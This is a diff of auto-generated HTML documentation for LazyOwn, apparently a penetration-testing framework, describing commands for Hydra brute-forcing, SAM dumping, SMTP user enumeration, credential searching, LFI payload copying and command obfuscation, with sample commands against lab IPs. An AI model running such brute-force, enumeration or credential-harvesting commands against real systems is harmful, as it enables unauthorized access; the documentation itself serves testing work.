@@ -1276,6 +1276,171 @@ readmeneitor.py</h1>
 <p>Documentación creada automaticamente por el script readmeneitor.py
 creado para este proyecto, quizas algún día tenga su propio repo por
 ahora no lo veo necesario.</p>
+<!-- START UTILS -->
+<h1 id="utils.md-documentation-by-readmeneitor.py">UTILS.md
+Documentation by readmeneitor.py</h1>
+<h2 id="print_error">print_error</h2>
+<p>Prints an error message to the console.</p>
+<p>This function takes an error message as input and prints it to the
+console with a specific format to indicate that it is an error.</p>
+<p>:param error: The error message to be printed. :type error: str
+:return: None</p>
+<h2 id="print_msg">print_msg</h2>
+<p>Prints a message to the console.</p>
+<p>This function takes a message as input and prints it to the console
+with a specific format to indicate that it is an informational
+message.</p>
+<p>:param msg: The message to be printed. :type msg: str :return:
+None</p>
+<h2 id="print_warn">print_warn</h2>
+<p>Prints a warning message to the console.</p>
+<p>This function takes a warning message as input and prints it to the
+console with a specific format to indicate that it is a warning.</p>
+<p>:param warn: The warning message to be printed. :type warn: str
+:return: None</p>
+<h2 id="signal_handler">signal_handler</h2>
+<p>Handles signals such as Control + C and shows a message on how to
+exit.</p>
+<p>This function is used to handle signals like Control + C (SIGINT) and
+prints a warning message instructing the user on how to exit the program
+using the commands ‘exit’, ‘q’, or ‘qa’.</p>
+<p>:param sig: The signal number. :type sig: int :param frame: The
+current stack frame. :type frame: frame :return: None</p>
+<h2 id="check_rhost">check_rhost</h2>
+<p>Checks if the remote host (rhost) is defined and shows an error
+message if it is not.</p>
+<p>This function verifies if the <code>rhost</code> parameter is set. If
+it is not defined, an error message is printed, providing an example and
+directing the user to additional help.</p>
+<p>:param rhost: The remote host to be checked. :type rhost: str
+:return: True if rhost is defined, False otherwise. :rtype: bool</p>
+<h2 id="check_lhost">check_lhost</h2>
+<p>Checks if the local host (lhost) is defined and shows an error
+message if it is not.</p>
+<p>This function verifies if the <code>lhost</code> parameter is set. If
+it is not defined, an error message is printed, providing an example and
+directing the user to additional help.</p>
+<p>:param lhost: The local host to be checked. :type lhost: str :return:
+True if lhost is defined, False otherwise. :rtype: bool</p>
+<h2 id="check_lport">check_lport</h2>
+<p>Checks if the local port (lport) is defined and shows an error
+message if it is not.</p>
+<p>This function verifies if the <code>lport</code> parameter is set. If
+it is not defined, an error message is printed, providing an example and
+directing the user to additional help.</p>
+<p>:param lport: The local port to be checked. :type lport: int or str
+:return: True if lport is defined, False otherwise. :rtype: bool</p>
+<h2 id="is_binary_present">is_binary_present</h2>
+<p>Internal function to verify if a binary is present on the operating
+system.</p>
+<p>This function checks if a specified binary is available in the
+system’s PATH by using the <code>which</code> command. It returns True
+if the binary is found and False otherwise.</p>
+<p>:param binary_name: The name of the binary to be checked. :type
+binary_name: str :return: True if the binary is present, False
+otherwise. :rtype: bool</p>
+<h2 id="handle_multiple_rhosts">handle_multiple_rhosts</h2>
+<p>Internal function to handle multiple remote hosts (rhost) for
+operations.</p>
+<p>This function is a decorator that allows an operation to be performed
+across multiple remote hosts specified in
+<code>self.params["rhost"]</code>. It converts a single remote host into
+a list if necessary, and then iterates over each host, performing the
+given function with each host. After the operation, it restores the
+original remote host value.</p>
+<p>:param func: The function to be decorated and executed for each
+remote host. :type func: function :return: The decorated function.
+:rtype: function</p>
+<h2 id="check_sudo">check_sudo</h2>
+<p>Checks if the script is running with superuser (sudo) privileges, and
+if not, restarts the script with sudo privileges.</p>
+<p>This function verifies if the script is being executed with root
+privileges by checking the effective user ID. If the script is not
+running as root, it prints a warning message and restarts the script
+using sudo.</p>
+<p>:return: None</p>
+<h2 id="activate_virtualenv">activate_virtualenv</h2>
+<p>Activates a virtual environment and starts an interactive shell.</p>
+<p>This function activates a virtual environment located at
+<code>venv_path</code> and then launches an interactive bash shell with
+the virtual environment activated.</p>
+<p>:param venv_path: The path to the virtual environment directory.
+:type venv_path: str :return: None</p>
+<h2 id="parse_proc_net_file">parse_proc_net_file</h2>
+<p>Internal function to parse a /proc/net file and extract network
+ports.</p>
+<p>This function reads a file specified by <code>file_path</code>,
+processes each line to extract local addresses and ports, and converts
+them from hexadecimal to decimal. The IP addresses are converted from
+hexadecimal format to standard dot-decimal notation. The function
+returns a list of tuples, each containing an IP address and a port
+number.</p>
+<p>:param file_path: The path to the /proc/net file to be parsed. :type
+file_path: str :return: A list of tuples, each containing an IP address
+and a port number. :rtype: list of tuple</p>
+<h2 id="get_open_ports">get_open_ports</h2>
+<p>Internal function to get open TCP and UDP ports on the operating
+system.</p>
+<p>This function uses the <code>parse_proc_net_file</code> function to
+extract open TCP and UDP ports from the corresponding /proc/net files.
+It returns two lists: one for TCP ports and one for UDP ports.</p>
+<p>:return: A tuple containing two lists: the first list with open TCP
+ports and the second list with open UDP ports. :rtype: tuple of (list of
+tuple, list of tuple)</p>
+<h2 id="find_credentials">find_credentials</h2>
+<p>Searches for potential credentials in files within the specified
+directory.</p>
+<p>This function uses a regular expression to find possible credentials
+such as passwords, secrets, API keys, and tokens in files within the
+given directory. It iterates through all files in the directory and
+prints any matches found.</p>
+<p>:param directory: The directory to search for files containing
+credentials. :type directory: str :return: None</p>
+<h2 id="rotate_char">rotate_char</h2>
+<p>Internal function to rotate characters for ROT cipher.</p>
+<p>This function takes a character and a shift value, and rotates the
+character by the specified shift amount. It only affects alphabetical
+characters, leaving non-alphabetical characters unchanged.</p>
+<p>:param c: The character to be rotated. :type c: str :param shift: The
+number of positions to shift the character. :type shift: int :return:
+The rotated character. :rtype: str</p>
+<h2 id="get_network_info">get_network_info</h2>
+<p>Retrieves network interface information with their associated IP
+addresses.</p>
+<p>This function executes a shell command to gather network interface
+details, parses the output to extract interface names and their
+corresponding IP addresses, and returns this information in a dictionary
+format. The dictionary keys are interface names, and the values are IP
+addresses.</p>
+<p>:return: A dictionary where the keys are network interface names and
+the values are their associated IP addresses. :rtype: dict</p>
+<h2 id="getprompt">getprompt</h2>
+<p>Generate a command prompt string with network information and user
+status.</p>
+<p>:param: None</p>
+<p>:returns: A string representing the command prompt with network
+information and user status.</p>
+<p>Manual execution: To manually get a prompt string with network
+information and user status, ensure you have
+<code>get_network_info()</code> implemented to return a dictionary of
+network interfaces and their IPs. Then use the function to create a
+prompt string based on the current user and network info.</p>
+<p>Example: If the function <code>get_network_info()</code> returns: {
+‘tun0’: ‘10.0.0.1’, ‘eth0’: ‘192.168.1.2’ }</p>
+<p>And the user is root, the prompt string generated might be:
+[LazyOwn👽10.0.0.1]# If the user is not root, it would be:
+[LazyOwn👽10.0.0.1]$</p>
+<p>If no ‘tun’ interface is found, the function will use the first
+available IP or fallback to ‘127.0.0.1’.</p>
+<h2 id="copy2clip">copy2clip</h2>
+<p>Copia el texto proporcionado al portapapeles usando xclip.</p>
+<p>Args: text (str): El texto que se desea copiar al portapapeles.</p>
+<p>Example: copy2clip(“Hello, World!”)</p>
+<h2 id="wrapper">wrapper</h2>
+<p>internal wrapper of internal function to implement multiples rhost to
+operate.</p>
+<!-- END UTILS -->
+<!-- START COMMANDS -->
 <h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
 Documentation by readmeneitor.py</h1>
 <h2 id="xor_encrypt_decrypt">xor_encrypt_decrypt</h2>
@@ -3492,7 +3657,7 @@ command prompt.</p>
 parameter to the clipboard if it is valid. 2. It updates the command
 prompt to include the <code>rhost</code> and the current working
 directory.</p>
-<p>Usage: rhost [clean]</p>
+<p>Usage: rhost <a href="#clean">clean</a></p>
 <p>:param line: An optional argument that determines the behavior of the
 function: - If ‘clean’, it resets the command prompt to its default
 format. - If any other value, it updates the command prompt to include
@@ -3674,117 +3839,1305 @@ to use clipboard functionalities.</p>
 <h2 id="sh">sh</h2>
 <p>execute some command direct in shell to avoid exit LazyOwn ;)</p>
 <h2 id="pwd">pwd</h2>
-<p>’echo -e “[`. It converts a single remote host into a list if
-necessary, and then iterates over each host, performing the given
-function with each host. After the operation, it restores the original
-remote host value.</p>
-<p>:param func: The function to be decorated and executed for each
-remote host. :type func: function :return: The decorated function.
-:rtype: function</p>
-<h2 id="check_sudo">check_sudo</h2>
-<p>Checks if the script is running with superuser (sudo) privileges, and
-if not, restarts the script with sudo privileges.</p>
-<p>This function verifies if the script is being executed with root
-privileges by checking the effective user ID. If the script is not
-running as root, it prints a warning message and restarts the script
-using sudo.</p>
-<p>:return: None</p>
-<h2 id="activate_virtualenv">activate_virtualenv</h2>
-<p>Activates a virtual environment and starts an interactive shell.</p>
-<p>This function activates a virtual environment located at
-<code>venv_path</code> and then launches an interactive bash shell with
-the virtual environment activated.</p>
-<p>:param venv_path: The path to the virtual environment directory.
-:type venv_path: str :return: None</p>
-<h2 id="parse_proc_net_file">parse_proc_net_file</h2>
-<p>Internal function to parse a /proc/net file and extract network
+<p>‘echo -e “[[34m” &amp;&amp; ls &amp;&amp; echo -en “[0m”’</p>
+<h2 id="qa">qa</h2>
+<p>Exit fast without confirmation</p>
+<h2 id="ignorearp">ignorearp</h2>
+<p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</p>
+<h2 id="ignoreicmp">ignoreicmp</h2>
+<p>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</p>
+<h2 id="acknowledgearp">acknowledgearp</h2>
+<p>echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</p>
+<h2 id="acknowledgeicmp">acknowledgeicmp</h2>
+<p>echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</p>
+<h2 id="clock">clock</h2>
+<p>Displays the current date and time, and runs a custom shell
+script.</p>
+<p>This function performs the following actions: 1. Constructs a command
+to get the current date and time in a specified format. 2. Uses
+<code>figlet</code> to display the current date and time in a large
+ASCII text format. 3. Runs a custom shell script (<code>cal.sh</code>)
+to display additional information or perform further actions related to
+the clock.</p>
+<p>Usage: clock</p>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Ensure that
+<code>figlet</code> is installed on your system for displaying text in
+large ASCII format. 2. Make sure <code>cal.sh</code> exists in the
+<code>modules</code> directory and is executable. 3. Run the function to
+see the current date and time displayed in large ASCII text, followed by
+the execution of <code>cal.sh</code>.</p>
+<p>Note: The function sets the terminal color to white before displaying
+the date and time, then sets it to green before running the
+<code>cal.sh</code> script. Finally, it resets the terminal color.</p>
+<p>Dependencies: - <code>figlet</code>: For displaying text in large
+ASCII format. - <code>cal.sh</code>: A custom shell script located in
+the <code>modules</code> directory.</p>
+<h2 id="ports">ports</h2>
+<p>Lists all open TCP and UDP ports on the local system.</p>
+<p>This function performs the following actions: 1. Calls the
+<code>get_open_ports</code> function to retrieve lists of open TCP and
+UDP ports. 2. Prints a header for open TCP ports. 3. Iterates over the
+list of open TCP ports, printing each IP address and port number. 4.
+Prints a header for open UDP ports. 5. Iterates over the list of open
+UDP ports, printing each IP address and port number.</p>
+<p>Usage: ports</p>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Ensure the
+<code>get_open_ports</code> function is defined and properly implemented
+to return lists of open TCP and UDP ports. 2. Run the function to
+display open TCP and UDP ports on the local system.</p>
+<p>Note: The <code>get_open_ports</code> function should return two
+lists of tuples: one for TCP ports and one for UDP ports. Each tuple
+should contain an IP address and a port number.</p>
+<h2 id="ssh">ssh</h2>
+<p>Connects to an SSH host using credentials from a file and a specified
+port.</p>
+<p>This function performs the following actions: 1. Retrieves the remote
+host (<code>rhost</code>) from the parameters. 2. Checks if the
+<code>rhost</code> is valid using the <code>check_rhost</code> function.
+3. Sets the SSH port to the value provided in the <code>line</code>
+parameter. 4. Checks if the <code>credentials.txt</code> file exists in
+the <code>./sessions</code> directory. 5. Reads credentials (username
+and password) from the <code>credentials.txt</code> file, where each
+line is formatted as <code>user:password</code>. 6. Constructs and
+executes an SSH command using <code>sshpass</code> to handle password
+authentication and <code>ssh</code> to initiate the connection. 7.
+Displays the SSH command being executed.</p>
+<p>Usage: ssh <port></p>
+<p>:param line: The port number to use for the SSH connection. :type
+line: str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Ensure
+<code>sessions/credentials.txt</code> exists and contains valid SSH
+credentials in the format <code>user:password</code>. 2. Run the
+function with the port number as an argument. 3. The function will
+attempt to connect to the SSH host using each set of credentials and the
+specified port.</p>
+<p>Note: Ensure <code>sshpass</code> is installed on your system for
+password-based SSH authentication. If <code>sshpass</code> is not
+available, you may need to install it or use an alternative method for
+SSH authentication.</p>
+<h2 id="cports">cports</h2>
+<p>Generates a command to display TCP and UDP ports and copies it to the
+clipboard.</p>
+<p>This function performs the following actions: 1. Defines a command to
+display TCP and UDP ports from <code>/proc/net/tcp</code> and
+<code>/proc/net/udp</code>, respectively. 2. The command extracts and
+formats IP addresses and port numbers from these files. 3. Prints the
+generated command to the console for verification. 4. Copies the command
+to the clipboard using <code>xclip</code>.</p>
+<p>Usage: cports # Generates the command and copies it to the
+clipboard</p>
+<p>:param line: This parameter is not used in this function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Run the function
+to print the command and copy it to the clipboard. 2. The command can be
+pasted into a terminal to display TCP and UDP ports.</p>
+<p>Note: Ensure <code>xclip</code> is installed on your system for
+copying to the clipboard. If <code>xclip</code> is not available, you
+may need to install it or use an alternative method for copying to the
+clipboard.</p>
+<h2 id="vpn">vpn</h2>
+<p>Connect to a VPN by selecting from available .ovpn files.</p>
+<p>This function performs the following actions: 1. Lists all
+<code>.ovpn</code> files in the current directory, sorted
+alphabetically. 2. Handles cases with and without arguments: - Without
+arguments: Lists available <code>.ovpn</code> files and prompts the user
+to select one by number. - With a single argument: Treats the argument
+as a number and attempts to connect to the corresponding
+<code>.ovpn</code> file. 3. Connects to the selected <code>.ovpn</code>
+file using <code>openvpn</code> and displays appropriate messages. 4.
+Handles invalid input with error messages.</p>
+<p>Usage: vpn # List available .ovpn files and select one to connect to
+vpn <number> # Connect directly to the .ovpn file corresponding to the
+number</p>
+<p>:param line: The number of the .ovpn file to connect to, or an empty
+string to list available files. :type line: str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Run the function
+with no arguments to list available <code>.ovpn</code> files. 2. Choose
+a file by entering the corresponding number. 3. Alternatively, run the
+function with a number argument to connect directly to the specified
+<code>.ovpn</code> file.</p>
+<p>Note: Ensure you have the necessary permissions and the
+<code>openvpn</code> command is available on your system.</p>
+<h2 id="id_rsa">id_rsa</h2>
+<p>Create an SSH private key file and connect to a remote host using
+SSH.</p>
+<p>This function performs the following actions: 1. Checks if the
+provided remote host (<code>rhost</code>) is valid. 2. Verifies that a
+username is provided as an argument. 3. Creates an SSH private key file
+in the <code>sessions</code> directory with a name based on the provided
+username. 4. Opens the created file in the <code>nano</code> text editor
+for the user to paste the private key. 5. Sets the file permissions to
+read-only for the owner (400). 6. Connects to the remote host via SSH
+using the created private key. 7. Displays a warning message when the
+SSH connection is closed.</p>
+<p>Usage: id_rsa <username></p>
+<p>:param line: The username for SSH connection and private key file
+naming. :type line: str :returns: None</p>
+<p>Manual execution: To manually use this function: 1. Run the function
+with the username argument, e.g., <code>id_rsa myuser</code>. 2. Paste
+the private key into the <code>nano</code> editor when prompted. 3. Save
+and exit the editor. 4. The SSH connection will be established using the
+private key.</p>
+<p>Note: Ensure you have the necessary permissions to create files and
+connect via SSH.</p>
+<h2 id="www">www</h2>
+<p>Start a web server using Python 3 and display relevant network
+information.</p>
+<p>This function performs the following actions: 1. Displays global
+network interfaces and their IP addresses. 2. Copies the IP address of
+the <code>tun0</code> interface to the clipboard. 3. Displays the
+current working directory and contents of the <code>sessions</code>
+directory. 4. Starts a Python 3 HTTP server on port 80 in the
+<code>sessions</code> directory. 5. Displays a message indicating that
+the web server is running and will show the shutdown message when
+stopped.</p>
+<p>Usage: www</p>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually use this function, run it to start the
+web server and follow the on-screen instructions to see the network
+information and server status.</p>
+<p>Note: Ensure you have <code>xclip</code> installed for clipboard
+operations and have the necessary permissions to run the HTTP
+server.</p>
+<h2 id="wrapper-1">wrapper</h2>
+<p>Copy payloads to clipboard for Local File Inclusion (LFI)
+attacks.</p>
+<p>This function provides three payload options for Local File Inclusion
+(LFI) attacks and copies the selected payload to the clipboard using
+<code>xclip</code>. The user is prompted to choose which payload to
+copy.</p>
+<p>Usage: wrapper</p>
+<p>:param line: This parameter is not used in the function. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually use this function, run it and follow
+the prompts to select one of the three predefined payloads. The selected
+payload will be copied to the clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed on your system for
+clipboard operations.</p>
+<h2 id="samrdump">samrdump</h2>
+<p>Run <code>impacket-samrdump</code> to dump SAM data from specified
 ports.</p>
-<p>This function reads a file specified by <code>file_path</code>,
-processes each line to extract local addresses and ports, and converts
-them from hexadecimal to decimal. The IP addresses are converted from
-hexadecimal format to standard dot-decimal notation. The function
-returns a list of tuples, each containing an IP address and a port
-number.</p>
-<p>:param file_path: The path to the /proc/net file to be parsed. :type
-file_path: str :return: A list of tuples, each containing an IP address
-and a port number. :rtype: list of tuple</p>
-<h2 id="get_open_ports">get_open_ports</h2>
-<p>Internal function to get open TCP and UDP ports on the operating
+<p>This function executes <code>impacket-samrdump</code> to retrieve SAM
+data from the target host on ports 139 and 445. It first checks if the
+<code>rhost</code> parameter is valid, and if so, it runs the command
+for both ports.</p>
+<p>Usage: samrdump <target_host></p>
+<p>:param line: The target host to dump SAM data from. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually run this task, specify the target host.
+The function will attempt to dump SAM data from the host on ports 139
+and 445. impacket-samrdump -port 445 10.10.10.10 Note: Ensure that
+<code>impacket-samrdump</code> is installed and properly configured on
+your system.</p>
+<h2 id="urlencode">urlencode</h2>
+<p>Encode a string for URL.</p>
+<p>This function takes a string as input, encodes it for URL
+compatibility using the <code>quote</code> function, and prints the
+encoded result.</p>
+<p>Usage: urlencode <string_to_encode></p>
+<p>:param line: The string to encode for URL. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run this task, provide a string to be
+URL-encoded as an argument. The function will encode it and print the
+result.</p>
+<p>Note: If no input is provided or the input is only whitespace, an
+error message will be displayed.</p>
+<h2 id="urldecode">urldecode</h2>
+<p>Decode a URL-encoded string.</p>
+<p>This function takes a URL-encoded string as input, decodes it using
+the <code>unquote</code> function, and prints the decoded result.</p>
+<p>Usage: urldecode <url_encoded_string></p>
+<p>:param line: The URL-encoded string to decode. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually run this task, provide a URL-encoded
+string as an argument. The function will decode it and print the
+result.</p>
+<p>Note: If no input is provided or the input is only whitespace, an
+error message will be displayed.</p>
+<h2 id="lynis">lynis</h2>
+<p>Performs a Lynis audit on the specified remote system.</p>
+<p>This function executes the <code>modules/lazylynis.sh</code> script
+with the target host defined in the <code>rhost</code> parameter. It is
+used to perform a security audit of the remote system using Lynis.</p>
+<p>Usage: lynis</p>
+<p>:param line: This parameter is not used in the current
+implementation. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this task, ensure that the
+<code>modules/lazylynis.sh</code> script is available and executable.
+Provide the target host in the format <code>lynis</code>. sudo lynis
+audit system remote 10.10.10.10 more info check modules/lazylynis.sh
+Note: The function assumes that <code>rhost</code> is a valid host
+address. If <code>rhost</code> is not valid, it will print an error
+message. For more details, check <code>modules/lazylynis.sh</code>.</p>
+<h2 id="snmpcheck">snmpcheck</h2>
+<p>Performs an SNMP check on the specified target host.</p>
+<p>This function executes the <code>snmp-check</code> command against
+the target host defined in the <code>rhost</code> parameter.</p>
+<p>Usage: snmpcheck</p>
+<p>:param line: This parameter is not used in the current
+implementation. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this task, ensure that
+<code>snmp-check</code> is installed and provide a target host in the
+format <code>snmpcheck</code>. snmp-check 10.10.10.10 Note: The function
+assumes that <code>rhost</code> is a valid host address. If
+<code>rhost</code> is not valid, it will print an error message.</p>
+<h2 id="encode">encode</h2>
+<p>Encodes a string using the specified shift value and substitution
+key.</p>
+<p>This function encodes the given string by applying a shift value and
+a substitution key.</p>
+<p>Usage: encode <shift_value> <substitution_key> <string></p>
+<p>:param line: The input string containing the shift value,
+substitution key, and the string to be encoded. The format should be
+‘<shift_value> <substitution_key> <string>’. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run this task, provide a shift value
+(integer), a substitution key, and the string to encode in the format
+<code>encode &lt;shift_value&gt; &lt;substitution_key&gt; &lt;string&gt;</code>.</p>
+<p>Note: The function assumes the shift value is an integer. If the
+shift value is not an integer, it will print an error message.</p>
+<h2 id="decode">decode</h2>
+<p>Decode a string using the specified shift value and substitution
+key.</p>
+<p>This function decodes the given string by applying a shift value and
+a substitution key to reverse the encoding process.</p>
+<p>Usage: decode <shift_value> <substitution_key> <string></p>
+<p>:param line: The input string containing the shift value,
+substitution key, and the string to be decoded. The format should be
+‘<shift_value> <substitution_key> <string>’. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run this task, provide a shift value
+(integer), a substitution key, and the string to decode in the format
+<code>decode &lt;shift_value&gt; &lt;substitution_key&gt; &lt;string&gt;</code>.</p>
+<p>Note: The function assumes the shift value is an integer. If the
+shift value is not an integer, it will print an error message.</p>
+<h2 id="creds">creds</h2>
+<p>Display the credentials stored in the <code>credentials.txt</code>
+file and copy the password to the clipboard.</p>
+<p>This function reads the stored credentials from a file named
+<code>credentials.txt</code> located in the <code>sessions</code>
+directory. The file should be in the format
+<code>username:password</code>. If the file does not exist, an error
+message will be printed instructing the user to create the credentials
+file first. The function extracts the username and password from the
+file, prints them, and copies the password to the clipboard using
+<code>xclip</code>.</p>
+<p>:param line: A string parameter that is not used in this function. It
+is included for compatibility with command-line interface functions.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually perform the equivalent actions, follow
+these steps:</p>
+<ol type="1">
+<li>Ensure the file <code>sessions/credentials.txt</code> exists and
+contains credentials in the format <code>username:password</code>.
+<ol start="2" type="1">
+<li><p>Read the file and extract the username and password.</p></li>
+<li><p>Print the username and password to the console.</p></li>
+<li><p>Use the <code>xclip</code> tool to copy the password to the
+clipboard. Example command:</p>
+<p>echo ‘<password>’ | xclip -sel clip</p></li>
+</ol></li>
+</ol>
+<p>Example: If <code>sessions/credentials.txt</code> contains
+<code>admin:password123</code>, the function will print:</p>
+<p>User : admin Pass : password123</p>
+<p>The password <code>password123</code> will be copied to the
+clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed on your system for
+copying to the clipboard. The function assumes that <code>xclip</code>
+is available and correctly configured.</p>
+<h2 id="rot">rot</h2>
+<p>Apply a ROT (rotation) substitution cipher to the given string.</p>
+<p>This function rotates each character in the input string by the
+specified number of positions in the alphabet. It supports rotation
+values between 1 and 27.</p>
+<p>Usage: rot <number> ‘<string>’</p>
+<p>:param line: The input string containing the number and the text to
+be rotated. The format should be ‘<number>’<string>’ where <number> is
+the rotation amount and <string> is the text to be ciphered. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually run this task, provide a number
+(rotation amount) and a string in the format
+<code>rot &lt;number&gt; '&lt;string&gt;'</code>. Ensure the number is
+between 1 and 27.</p>
+<p>Note: The function assumes that the rotation number is an integer
+between 1 and 27. If the number is out of range or not a valid integer,
+it will print an error message.</p>
+<h2 id="hydra">hydra</h2>
+<p>Uses Hydra to perform a brute force attack on a specified HTTP
+service with a user and password list.</p>
+<ol type="1">
+<li>Checks if a wordlist is provided; if not, prints an error
+message.</li>
+<li>Validates the remote host parameter.</li>
+<li>Checks if the <code>line</code> argument is provided, which should
+include the path to crack and the port.</li>
+<li>If the <code>line</code> argument is valid, splits it into arguments
+for the path and port.</li>
+<li>Constructs and prints the Hydra command with the provided
+parameters.</li>
+<li>Executes the Hydra command using <code>os.system</code>.</li>
+</ol>
+<p>:param line: The path to crack and port for the Hydra command,
+formatted as ‘path port’. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this task, you would: - Provide the
+path to crack and the port as arguments to this function in the format
+‘path port’. - Ensure that the user list and wordlist are set correctly.
+- hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt
+10.10.11.9 -s 5000 https-get /v2/ Note: Ensure that the remote host and
+wordlist parameters are valid, and that the path and port are specified
+correctly in the <code>line</code> argument.</p>
+<h2 id="nmapscript">nmapscript</h2>
+<p>Perform an Nmap scan using a specified script and port.</p>
+<p>:param line: A string containing the Nmap script and port, separated
+by a space. Example: “http-enum 80”.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually run an Nmap scan with a script and
+port, use the following command format:</p>
+nmap –script
+<script>
+<p>-p <port> <target> -oN <output-file></p>
+<p>Example: If you want to use the script <code>http-enum</code> on port
+<code>80</code> for the target <code>10.10.10.10</code>, you would
+run:</p>
+<pre><code>nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10</code></pre>
+<p>Ensure you have the target host (<code>rhost</code>) set in the
+parameters and provide the script and port as arguments. The results
+will be saved in the file
+<code>sessions/webScan_&lt;rhost&gt;</code>.</p>
+<h2 id="encoderpayload">encoderpayload</h2>
+<p>Applies various obfuscations to a given command line string to create
+multiple obfuscated versions.</p>
+<ol type="1">
+<li>Defines a helper function <code>double_base64_encode(cmd)</code>
+that performs double Base64 encoding on a given command.</li>
+<li>Defines the <code>apply_obfuscations(cmd)</code> function to create
+a list of obfuscated commands using different techniques.</li>
+<li>Applies these obfuscations to the provided <code>line</code>
+argument and prints each obfuscated command.</li>
+</ol>
+<p>:param line: The command line string to be obfuscated. :type line:
+str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would: - Provide
+the command you want to obfuscate as the argument to this function. -
+The function will generate various obfuscated versions of the command
+and print them.</p>
+<p>Note: Ensure that the command is properly formatted and valid to
+avoid errors during obfuscation. The obfuscations may involve different
+encoding and string manipulation techniques.</p>
+<h2 id="smtpuserenum">smtpuserenum</h2>
+<p>Enumerates SMTP users using the <code>smtp-user-enum</code> tool with
+the VRFY method.</p>
+<ol type="1">
+<li>Checks if the <code>rhost</code> (remote host) parameter is
+set:</li>
+</ol>
+<ul>
+<li>If not set, displays an error message and exits the function.</li>
+</ul>
+<ol start="2" type="1">
+<li>Checks if the <code>usrwordlist</code> (user wordlist) parameter is
+provided:</li>
+</ol>
+<ul>
+<li>If not provided, displays an error message indicating that the
+<code>p</code> or <code>payload</code> parameter should be used to load
+payloads.</li>
+</ul>
+<ol start="3" type="1">
+<li>If both parameters are provided:</li>
+</ol>
+<ul>
+<li>Displays the command that will be executed for user
+enumeration.</li>
+<li>Runs
+<code>sudo smtp-user-enum -M VRFY -U &lt;usrwordlist&gt; -t &lt;rhost&gt;</code>
+to perform user enumeration.</li>
+</ul>
+<p>:param line: Not used in this function. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that the <code>rhost</code> parameter is set with the target IP
+address using <code>set rhost &lt;IP&gt;</code>. - Load the user
+wordlist using the <code>set usrwordlist &lt;path&gt;</code> command. -
+Execute the command
+<code>sudo smtp-user-enum -M VRFY -U &lt;usrwordlist&gt; -t &lt;rhost&gt;</code>.
+- Ex: sudo smtp-user-enum -M VRFY -U
+/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt
+-t 10.10.10.10 Note: Ensure that you have the necessary permissions to
+run <code>smtp-user-enum</code> with <code>sudo</code> and that the
+wordlist file exists at the specified path.</p>
+<h2 id="sshd">sshd</h2>
+<p>Starts the SSH service and displays its status.</p>
+<ol type="1">
+<li>Executes the command to start the SSH service:</li>
+</ol>
+<ul>
+<li>Runs <code>sudo systemctl start ssh</code> to initiate the SSH
+service.</li>
+</ul>
+<ol start="2" type="1">
+<li>Displays the status of the SSH service:</li>
+</ol>
+<ul>
+<li>Runs <code>sudo systemctl status ssh</code> to show the current
+status of the SSH service.</li>
+</ul>
+<p>:param line: Not used in this function. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Execute <code>sudo systemctl start ssh</code> to start the SSH service.
+- Run <code>sudo systemctl status ssh</code> to check the status of the
+SSH service.</p>
+<p>Note: Ensure that you have the necessary permissions to start
+services using <code>sudo</code> and that the SSH service is installed
+on your system.</p>
+<h2 id="nmapscripthelp">nmapscripthelp</h2>
+<p>Provides help to find and display information about Nmap scripts.</p>
+<ol type="1">
+<li>Checks if an argument is provided:</li>
+</ol>
+<ul>
+<li>If no argument is given, displays an error message indicating the
+need to pass a script name.</li>
+</ul>
+<ol start="2" type="1">
+<li>Executes a command to display script help:</li>
+</ol>
+<ul>
+<li>Runs <code>nmap --script-help</code> with the provided argument
+(appending a wildcard <code>*</code> to match script names).</li>
+<li>Prints a message with the command being executed and provides
+further instructions for using the Nmap script.</li>
+</ul>
+<ol start="3" type="1">
+<li>Prints a message suggesting the next step:</li>
+</ol>
+<ul>
+<li>Provides a suggestion for running Nmap with the appropriate script
+and options based on the search results.</li>
+</ul>
+<p>:param line: The script or keyword to search for in the Nmap script
+help output. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Run <code>nmap --script-help</code> with the specific script name or
+keyword. - Use the script names in Nmap commands to run scans with the
+desired scripts.</p>
+<p>Note: Ensure that <code>nmap</code> is installed and accessible in
+the system’s PATH.</p>
+<h2 id="apropos">apropos</h2>
+<p>Search for commands matching the given parameter in the cmd interface
+and optionally extend the search using the system’s <code>apropos</code>
+command.</p>
+<p>:param line: The search term to find matching commands.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually search for commands matching a term
+using the <code>apropos</code> command, use the following command:</p>
+<pre><code>apropos &lt;search_term&gt;</code></pre>
+<p>Example: apropos network</p>
+<p>The <code>apropos</code> command will search for commands and
+documentation that match the given search term.</p>
